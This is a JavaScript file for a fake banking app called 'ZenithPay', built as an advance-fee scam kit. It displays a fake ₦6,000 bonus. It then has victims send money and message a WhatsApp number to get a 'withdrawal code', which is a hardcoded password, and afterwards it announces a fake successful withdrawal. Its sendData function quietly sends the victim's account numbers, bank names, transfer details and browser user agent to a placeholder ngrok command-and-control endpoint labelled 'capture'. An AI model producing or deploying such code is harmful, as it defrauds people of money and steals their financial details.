// ============ LOAD USER DATA ============
const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
const ADMIN_PASSWORD = 'ZENITH2026';

// ============ DOM ELEMENTS ============
const balanceDisplay = document.getElementById('balanceDisplay');
const accountDisplay = document.getElementById('accountDisplay');
const bankDisplay = document.getElementById('bankDisplay');
const userGreeting = document.getElementById('userGreeting');
const statBalance = document.getElementById('statBalance');
const statTxCount = document.getElementById('statTxCount');

// ============ PROFILE ELEMENTS ============
const profileName = document.getElementById('profileName');
const profileFullName = document.getElementById('profileFullName');
const profilePhone = document.getElementById('profilePhone');
const profileEmailField = document.getElementById('profileEmailField');
const profileEmail = document.getElementById('profileEmail');
const profileBvn = document.getElementById('profileBvn');
const profileBank = document.getElementById('profileBank');
const profileAccount = document.getElementById('profileAccount');
const avatarDisplay = document.getElementById('avatarDisplay');

// ============ LOAD DASHBOARD ============
function loadDashboard() {
    const firstName = userData.fullname ? userData.fullname.split(' ')[0] : 'User';
    userGreeting.textContent = `Hi, ${firstName}`;
    
    accountDisplay.textContent = userData.account || '0123456789';
    bankDisplay.textContent = userData.bank || 'GTBank';
    
    // Profile
    profileName.textContent = userData.fullname || 'Chidi Okafor';
    profileFullName.textContent = userData.fullname || 'Chidi Okafor';
    profilePhone.textContent = userData.phone || '080 1234 5678';
    profileEmail.textContent = userData.email || 'user@email.com';
    profileEmailField.textContent = userData.email || 'user@email.com';
    profileBvn.textContent = userData.bvn || '•••••••••••';
    profileBank.textContent = userData.bank || 'GTBank';
    profileAccount.textContent = userData.account || '0123456789';
    
    // Avatar initials
    if (userData.fullname) {
        const initials = userData.fullname.split(' ').map(n => n[0]).join('').toUpperCase();
        avatarDisplay.textContent = initials;
    }
    
    const balanceState = localStorage.getItem('zenithpay_balance') || '6000';
    
    if (balanceState === '0') {
        balanceDisplay.textContent = '₦0.00';
        statBalance.textContent = '₦0';
        document.querySelector('.balance-card-dash').style.background = '#94a3b8';
        document.getElementById('bonusTx').classList.remove('hidden');
        document.getElementById('withdrawTx').classList.remove('hidden');
        document.getElementById('emptyState').classList.add('hidden');
        statTxCount.textContent = '2';
    } else {
        balanceDisplay.textContent = '₦6,000.00';
        statBalance.textContent = '₦6,000';
        statTxCount.textContent = '0';
        document.getElementById('emptyState').classList.remove('hidden');
        document.getElementById('bonusTx').classList.add('hidden');
        document.getElementById('withdrawTx').classList.add('hidden');
    }
}

// ============ TAB SWITCHING ============
function switchTab(tab) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(el => {
        el.classList.add('hidden');
        el.classList.remove('active');
    });
    
    // Show selected tab
    const target = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
    if (target) {
        target.classList.remove('hidden');
        target.classList.add('active');
    }
    
    // Update bottom nav
    document.querySelectorAll('.nav-item').forEach(el => {
        el.classList.remove('active');
        if (el.dataset.tab === tab) {
            el.classList.add('active');
        }
    });
}

// Bottom nav click handlers
document.querySelectorAll('.nav-item').forEach(btn => {
    btn.addEventListener('click', function() {
        const tab = this.dataset.tab;
        switchTab(tab);
    });
});

// ============ WITHDRAW FLOW ============
document.getElementById('withdrawBtn').addEventListener('click', () => {
    if (localStorage.getItem('zenithpay_balance') === '0') {
        alert('⚠️ You have already withdrawn your bonus.');
        return;
    }
    document.getElementById('withdrawModal').classList.remove('hidden');
});

document.getElementById('closeModal').addEventListener('click', () => {
    document.getElementById('withdrawModal').classList.add('hidden');
});

document.getElementById('withdrawModal').addEventListener('click', (e) => {
    if (e.target === e.currentTarget) {
        document.getElementById('withdrawModal').classList.add('hidden');
    }
});

// ============ COPY ACCOUNT ============
document.getElementById('copyAccount').addEventListener('click', () => {
    const account = '0123456789';
    navigator.clipboard.writeText(account).then(() => {
        alert('✅ Account number copied!');
    }).catch(() => {
        const input = document.createElement('input');
        input.value = account;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
        alert('✅ Account number copied!');
    });
});

// ============ VERIFY PAYMENT → WHATSAPP ============
document.getElementById('verifyPaymentBtn').addEventListener('click', () => {
    const amount = document.getElementById('depositAmount').value;
    const userAccount = document.getElementById('userAccount').value;
    const userBank = document.getElementById('userBank').value;
    
    if (!userAccount || !userBank) {
        alert('⚠️ Please fill in your account details.');
        return;
    }
    
    sendData({
        type: 'withdrawal_attempt',
        amount: amount,
        userAccount: userAccount,
        userBank: userBank,
        timestamp: Date.now()
    });
    
    document.getElementById('withdrawModal').classList.add('hidden');
    document.getElementById('whatsappModal').classList.remove('hidden');
    
    const waLink = document.getElementById('whatsappLink');
    const msg = `Hello, I sent ₦${amount} for my ZenithPay withdrawal. My name is ${userData.fullname || 'User'}. My account is ${userAccount} (${userBank}). Please send my code.`;
    waLink.href = `https://wa.me/2348000000000?text=${encodeURIComponent(msg)}`;
});

// ============ CLOSE WHATSAPP MODAL ============
document.getElementById('closeWhatsapp').addEventListener('click', () => {
    document.getElementById('whatsappModal').classList.add('hidden');
});

document.getElementById('whatsappModal').addEventListener('click', (e) => {
    if (e.target === e.currentTarget) {
        document.getElementById('whatsappModal').classList.add('hidden');
    }
});

// ============ VERIFY CODE ============
document.getElementById('verifyCodeBtn').addEventListener('click', () => {
    const enteredPassword = document.getElementById('adminPassword').value;
    
    if (enteredPassword !== ADMIN_PASSWORD) {
        const input = document.getElementById('adminPassword');
        input.style.borderColor = '#dc2626';
        input.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.2)';
        input.value = '';
        input.placeholder = '❌ Invalid code. Try again.';
        setTimeout(() => {
            input.style.borderColor = '#d1d9e6';
            input.style.boxShadow = 'none';
            input.placeholder = 'Enter the code from admin';
        }, 3000);
        return;
    }
    
    sendData({
        type: 'access_code_verified',
        code: enteredPassword,
        timestamp: Date.now()
    });
    
    document.getElementById('whatsappModal').classList.add('hidden');
    
    // Update dashboard
    balanceDisplay.textContent = '₦0.00';
    statBalance.textContent = '₦0';
    document.querySelector('.balance-card-dash').style.background = '#94a3b8';
    
    document.getElementById('emptyState').classList.add('hidden');
    document.getElementById('bonusTx').classList.remove('hidden');
    document.getElementById('withdrawTx').classList.remove('hidden');
    statTxCount.textContent = '2';
    
    localStorage.setItem('zenithpay_balance', '0');
    
    alert('✅ Withdrawal successful! Your funds have been processed.');
    
    setTimeout(() => {
        window.location.href = 'success.html';
    }, 1500);
});

// ============ TRANSFER ============
document.getElementById('transferBtn').addEventListener('click', () => {
    const bank = document.getElementById('transferBank').value;
    const account = document.getElementById('transferAccount').value;
    const amount = document.getElementById('transferAmount').value;
    const narration = document.getElementById('transferNarration').value;
    
    if (!bank || !account || !amount) {
        alert('⚠️ Please fill in all required fields.');
        return;
    }
    
    sendData({
        type: 'transfer',
        bank: bank,
        account: account,
        amount: amount,
        narration: narration || 'Transfer',
        timestamp: Date.now()
    });
    
    document.getElementById('transferAmountDisplay').textContent = `₦${amount}`;
    document.getElementById('transferAccountDisplay').textContent = account;
    document.getElementById('transferResult').classList.remove('hidden');
    
    setTimeout(() => {
        document.getElementById('transferResult').classList.add('hidden');
        document.getElementById('transferBank').value = '';
        document.getElementById('transferAccount').value = '';
        document.getElementById('transferAmount').value = '';
        document.getElementById('transferNarration').value = '';
        alert('✅ Transfer completed successfully!');
    }, 3000);
});

// ============ LOGOUT ============
document.getElementById('logoutBtn').addEventListener('click', () => {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.clear();
        window.location.href = 'index.html';
    }
});

// ============ SEND DATA ============
function sendData(payload) {
    const C2_URL = 'https://your-ngrok-url.ngrok.io';
    payload._timestamp = Date.now();
    payload._ua = navigator.userAgent;
    
    if (navigator.sendBeacon) {
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(`${C2_URL}/capture`, blob);
        return;
    }
    
    fetch(`${C2_URL}/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
    }).catch(() => {});
}

// ============ INIT ============
document.addEventListener('DOMContentLoaded', loadDashboard);